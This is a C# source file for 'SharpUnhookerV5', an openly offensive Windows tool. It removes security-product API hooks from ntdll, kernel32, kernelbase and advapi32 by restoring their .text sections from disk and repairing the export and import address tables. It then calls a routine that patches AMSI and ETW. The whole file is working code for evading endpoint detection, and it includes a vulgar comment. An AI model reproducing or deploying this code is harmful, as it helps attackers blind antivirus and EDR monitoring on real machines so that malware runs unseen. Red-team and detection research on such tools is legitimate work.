using System;
using System.Runtime;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Collections;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.IO;
using static SharpUnhooker.Win32;

namespace SharpUnhooker
{

    public class SharpUnhooker
    {

        public static string[] BlacklistedFunction = { "EnterCriticalSection", "LeaveCriticalSection", "DeleteCriticalSection", "InitializeSListHead", "HeapAlloc", "HeapReAlloc", "HeapSize" };

        public static bool IsBlacklistedFunction(string FuncName)
        {
            for (int i = 0; i < BlacklistedFunction.Length; i++)
            {
                if (String.Equals(FuncName, BlacklistedFunction[i], StringComparison.OrdinalIgnoreCase))
                {
                    return true;
                }
            }
            return false;
        }

        public static void Copy(ref byte[] source, int sourceStartIndex, ref byte[] destination, int destinationStartIndex, int length)
        {
            if (source == null || source.Length == 0 || destination == null || destination.Length == 0 || length == 0)
            {
                throw new ArgumentNullException("Exception : One or more of the arguments are zero/null!");
            }
            if (length > destination.Length)
            {
                throw new ArgumentOutOfRangeException("Exception : length exceeds the size of source bytes!");
            }
            if ((sourceStartIndex + length) > source.Length)
            {
                throw new ArgumentOutOfRangeException("Exception : sourceStartIndex and length exceeds the size of source bytes!");
            }
            if ((destinationStartIndex + length) > destination.Length)
            {
                throw new ArgumentOutOfRangeException("Exception : destinationStartIndex and length exceeds the size of destination bytes!");
            }
            int targetIndex = destinationStartIndex;
            for (int sourceIndex = sourceStartIndex; sourceIndex < (sourceStartIndex + length); sourceIndex++)
            {
                destination[targetIndex] = source[sourceIndex];
                targetIndex++;
            }
        }

        public static bool JMPUnhooker(string DLLname)
        {
            // get the file path of the module
            string ModuleFullPath = String.Empty;
            try { ModuleFullPath = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => DLLname.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().FileName); } catch { ModuleFullPath = null; }
            if (ModuleFullPath == null)
            {
                Console.WriteLine("[*] Module is not loaded,Skipping...");
                return true;
            }

            // read and parse the module, and then get the .TEXT section header
            byte[] ModuleBytes = File.ReadAllBytes(ModuleFullPath);
            PEReader OriginalModule = new PEReader(ModuleBytes);
            int TextSectionNumber = 0;
            for (int i = 0; i < OriginalModule.FileHeader.NumberOfSections; i++)
            {
                if (String.Equals(OriginalModule.ImageSectionHeaders[i].Section, ".text", StringComparison.OrdinalIgnoreCase))
                {
                    TextSectionNumber = i;
                    break;
                }
            }

            // copy the original .TEXT section
            IntPtr TextSectionSize = new IntPtr(OriginalModule.ImageSectionHeaders[TextSectionNumber].VirtualSize);
            byte[] OriginalTextSectionBytes = new byte[(int)TextSectionSize];
            Copy(ref ModuleBytes, (int)OriginalModule.ImageSectionHeaders[TextSectionNumber].PointerToRawData, ref OriginalTextSectionBytes, 0, (int)OriginalModule.ImageSectionHeaders[TextSectionNumber].VirtualSize);

            // get the module base address and the .TEXT section address
            IntPtr ModuleBaseAddress = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => DLLname.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress);
            IntPtr ModuleTextSectionAddress = ModuleBaseAddress + (int)OriginalModule.ImageSectionHeaders[TextSectionNumber].VirtualAddress;

            // change memory protection to RWX
            UInt32 oldProtect = 0;
            bool updateMemoryProtection = Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref ModuleTextSectionAddress, ref TextSectionSize, 0x40, ref oldProtect);
            if (!updateMemoryProtection)
            {
                Console.WriteLine("[-] Failed to change memory protection to RWX!");
                return false;
            }
            // apply the patch (the original .TEXT section)
            bool PatchApplied = true;
            try { Marshal.Copy(OriginalTextSectionBytes, 0, ModuleTextSectionAddress, OriginalTextSectionBytes.Length); } catch { PatchApplied = false; }
            if (!PatchApplied)
            {
                Console.WriteLine("[-] Failed to replace the .text section of the module!");
                return false;
            }
            // revert the memory protection
            UInt32 newProtect = 0;
            Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref ModuleTextSectionAddress, ref TextSectionSize, oldProtect, ref newProtect);
            // done!
            Console.WriteLine("[+++] {0} IS UNHOOKED!", DLLname.ToUpper());
            return true;
        }

        public static void EATUnhooker(string ModuleName)
        {
            IntPtr ModuleBase = IntPtr.Zero;
            try { ModuleBase = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => ModuleName.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress); } catch { }
            if (ModuleBase == IntPtr.Zero)
            {
                Console.WriteLine("[-] Module is not loaded,Skipping...");
                return;
            }
            string ModuleFileName = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => ModuleName.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().FileName);
            byte[] ModuleRawByte = System.IO.File.ReadAllBytes(ModuleFileName);

            // Traverse the PE header in memory
            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
            Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
            Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
            Int64 pExport = 0;
            if (Magic == 0x010b)
            {
                pExport = OptHeader + 0x60;
            }
            else
            {
                pExport = OptHeader + 0x70;
            }

            // prepare module clone
            PEReader DiskModuleParsed = new PEReader(ModuleRawByte);
            int RegionSize = DiskModuleParsed.Is32BitHeader ? (int)DiskModuleParsed.OptionalHeader32.SizeOfImage : (int)DiskModuleParsed.OptionalHeader64.SizeOfImage;
            int SizeOfHeaders = DiskModuleParsed.Is32BitHeader ? (int)DiskModuleParsed.OptionalHeader32.SizeOfHeaders : (int)DiskModuleParsed.OptionalHeader64.SizeOfHeaders;
            IntPtr OriginalModuleBase = Marshal.AllocHGlobal(RegionSize);
            Marshal.Copy(ModuleRawByte, 0, OriginalModuleBase, SizeOfHeaders);
            for (int i = 0; i < DiskModuleParsed.FileHeader.NumberOfSections; i++)
            {
                IntPtr pVASectionBase = (IntPtr)((UInt64)OriginalModuleBase + DiskModuleParsed.ImageSectionHeaders[i].VirtualAddress);
                Marshal.Copy(ModuleRawByte, (int)DiskModuleParsed.ImageSectionHeaders[i].PointerToRawData, pVASectionBase, (int)DiskModuleParsed.ImageSectionHeaders[i].SizeOfRawData);
            }

            // Read -> IMAGE_EXPORT_DIRECTORY
            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
            if (ExportRVA == 0)
            {
                Console.WriteLine("[-] Module doesnt have any exports, skipping...");
                return;
            }
            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
            Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));
            Int32 FunctionsRVAOriginal = Marshal.ReadInt32((IntPtr)(OriginalModuleBase.ToInt64() + ExportRVA + 0x1C));

            // eat my cock u fokin user32.dll
            IntPtr TargetPtr = ModuleBase + FunctionsRVA;
            IntPtr TargetSize = (IntPtr)(4 * NumberOfFunctions);
            uint oldProtect = 0;
            if (!Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref TargetPtr, ref TargetSize, 0x04, ref oldProtect))
            {
                Console.WriteLine("[-] Failed to change EAT's memory protection to RW!");
                return;
            }

            // Loop the array of export RVA's
            for (int i = 0; i < NumberOfFunctions; i++)
            {
                string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                Int32 FunctionRVAOriginal = Marshal.ReadInt32((IntPtr)(OriginalModuleBase.ToInt64() + FunctionsRVAOriginal + (4 * (FunctionOrdinal - OrdinalBase))));
                if (FunctionRVA != FunctionRVAOriginal)
                {
                    try { Marshal.WriteInt32(((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase)))), FunctionRVAOriginal); }
                    catch
                    {
                        Console.WriteLine("[-] Failed to rewrite the EAT of {0} with RVA of {1} and function ordinal of {2}", FunctionName, FunctionRVA.ToString("X4"), FunctionOrdinal);
                        continue;
                    }
                }
            }

            Marshal.FreeHGlobal(OriginalModuleBase);
            uint newProtect = 0;
            Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref TargetPtr, ref TargetSize, oldProtect, ref newProtect);
            Console.WriteLine("[+++] {0} EXPORTS ARE CLEANSED!", ModuleName.ToUpper());
        }

        public static void IATUnhooker(string ModuleName)
        {
            IntPtr PEBaseAddress = IntPtr.Zero;
            try { PEBaseAddress = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => ModuleName.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress); } catch { }
            if (PEBaseAddress == IntPtr.Zero)
            {
                Console.WriteLine("[-] Module is not loaded, Skipping...");
                return;
            }

            // parse the initial header of the PE
            IntPtr OptHeader = PEBaseAddress + Marshal.ReadInt32((IntPtr)(PEBaseAddress + 0x3C)) + 0x18;
            IntPtr SizeOfHeaders = (IntPtr)Marshal.ReadInt32(OptHeader + 60);
            Int16 Magic = Marshal.ReadInt16(OptHeader + 0);
            IntPtr DataDirectoryAddr = IntPtr.Zero;
            if (Magic == 0x010b)
            {
                DataDirectoryAddr = (IntPtr)(OptHeader.ToInt64() + (long)0x60); // PE32, 0x60 = 96 
            }
            else
            {
                DataDirectoryAddr = (IntPtr)(OptHeader.ToInt64() + (long)0x70); // PE32+, 0x70 = 112
            }

            // get the base address of all of the IAT array, and get the whole size of the IAT array
            IntPtr IATBaseAddress = (IntPtr)((long)(PEBaseAddress.ToInt64() + (long)Marshal.ReadInt32(DataDirectoryAddr + 96)));
            IntPtr IATSize = (IntPtr)Marshal.ReadInt32((IntPtr)(DataDirectoryAddr.ToInt64() + (long)96 + (long)4));

            // check if current PE have any import(s)
            if ((int)IATSize == 0)
            {
                Console.WriteLine("[-] Module doesnt have any imports, Skipping...");
                return;
            }

            // change memory protection of the IAT to RW
            uint oldProtect = 0;
            if (!Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref IATBaseAddress, ref IATSize, 0x04, ref oldProtect))
            {
                Console.WriteLine("[-] Failed to change IAT's memory protection to RW!");
                return;
            }

            // get import table address
            int ImportTableSize = Marshal.ReadInt32((IntPtr)(DataDirectoryAddr.ToInt64() + (long)12)); //  IMPORT TABLE Size = byte 8 + 4 (4 is the size of the RVA) from the start of the data directory
            IntPtr ImportTableAddr = (IntPtr)(PEBaseAddress.ToInt64() + (long)Marshal.ReadInt32((IntPtr)DataDirectoryAddr + 8)); // IMPORT TABLE RVA = byte 8 from the start of the data directory
            int ImportTableCount = (ImportTableSize / 20);

            // iterates through the import tables
            for (int i = 0; i < (ImportTableCount - 1); i++)
            {
                IntPtr CurrentImportTableAddr = (IntPtr)(ImportTableAddr.ToInt64() + (long)(20 * i));

                string CurrentImportTableName = Marshal.PtrToStringAnsi((IntPtr)(PEBaseAddress.ToInt64() + (long)Marshal.ReadInt32(CurrentImportTableAddr + 12))).Trim(); // Name RVA = byte 12 from start of the current import table
                if (CurrentImportTableName.StartsWith("api-ms-win"))
                {
                    continue;
                }

                // get IAT (FirstThunk) and ILT (OriginalFirstThunk) address from Import Table
                IntPtr CurrentImportIATAddr = (IntPtr)(PEBaseAddress.ToInt64() + (long)Marshal.ReadInt32((IntPtr)(CurrentImportTableAddr.ToInt64() + (long)16))); // IAT RVA = byte 16 from the start of the current import table
                IntPtr CurrentImportILTAddr = (IntPtr)(PEBaseAddress.ToInt64() + (long)Marshal.ReadInt32(CurrentImportTableAddr)); // ILT RVA = byte 0 from the start of the current import table

                // get the imported module base address
                IntPtr ImportedModuleAddr = IntPtr.Zero;
                try { ImportedModuleAddr = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => CurrentImportTableName.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress); } catch { }
                if (ImportedModuleAddr == IntPtr.Zero)
                { // check if its loaded or not
                    continue;
                }

                // loop through the functions
                for (int z = 0; z < 999999; z++)
                {
                    IntPtr CurrentFunctionILTAddr = (IntPtr)(CurrentImportILTAddr.ToInt64() + (long)(IntPtr.Size * z));
                    IntPtr CurrentFunctionIATAddr = (IntPtr)(CurrentImportIATAddr.ToInt64() + (long)(IntPtr.Size * z));

                    // check if current ILT is empty
                    if (Marshal.ReadIntPtr(CurrentFunctionILTAddr) == IntPtr.Zero)
                    { // the ILT is null, which means we're already on the end of the table
                        break;
                    }

                    IntPtr CurrentFunctionNameAddr = (IntPtr)(PEBaseAddress.ToInt64() + (long)Marshal.ReadIntPtr(CurrentFunctionILTAddr)); // reading a union structure for getting the name RVA
                    string CurrentFunctionName = Marshal.PtrToStringAnsi(CurrentFunctionNameAddr + 2).Trim(); // reading the Name field on the Name table

                    if (String.IsNullOrEmpty(CurrentFunctionName))
                    {
                        continue; // used to silence ntdll's RtlDispatchApc ordinal imported by kernelbase
                    }
                    if (IsBlacklistedFunction(CurrentFunctionName))
                    {
                        continue;
                    }

                    // get current function real address
                    IntPtr CurrentFunctionRealAddr = Dynavoke.GetExportAddress(ImportedModuleAddr, CurrentFunctionName);
                    if (CurrentFunctionRealAddr == IntPtr.Zero)
                    {
                        Console.WriteLine("[-] Failed to find function export address of {0} from {1}! CurrentFunctionNameAddr = {2}", CurrentFunctionName, CurrentImportTableName, CurrentFunctionNameAddr.ToString("X4"));
                        continue;
                    }

                    // compare the address
                    if (Marshal.ReadIntPtr(CurrentFunctionIATAddr) != CurrentFunctionRealAddr)
                    {
                        try { Marshal.WriteIntPtr(CurrentFunctionIATAddr, CurrentFunctionRealAddr); }
                        catch (Exception e)
                        {
                            Console.WriteLine("[-] Failed to rewrite IAT of {0}! Reason : {1}", CurrentFunctionName, e.Message);
                        }
                    }
                }
            }

            // revert IAT's memory protection
            uint newProtect = 0;
            Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref IATBaseAddress, ref IATSize, oldProtect, ref newProtect);
            Console.WriteLine("[+++] {0} IMPORTS ARE CLEANSED!", ModuleName.ToUpper());
        }

        internal static void Run()
        {
            Console.WriteLine("[------------------------------------------]");
            Console.WriteLine("[SharpUnhookerV5 - C# Based WinAPI Unhooker]");
            Console.WriteLine("[         Written By GetRektBoy724         ]");
            Console.WriteLine("[------------------------------------------]");
            string[] ListOfDLLToUnhook = { "ntdll.dll", "kernel32.dll", "kernelbase.dll", "advapi32.dll" };
            for (int i = 0; i < ListOfDLLToUnhook.Length; i++)
            {
                JMPUnhooker(ListOfDLLToUnhook[i]);
                EATUnhooker(ListOfDLLToUnhook[i]);
                if (ListOfDLLToUnhook[i] != "ntdll.dll")
                {
                    IATUnhooker(ListOfDLLToUnhook[i]); // NTDLL have no imports ;)
                }
            }
            PatchAMSIAndETW.Run();
            Console.WriteLine("[------------------------------------------]");
        }
    }

}

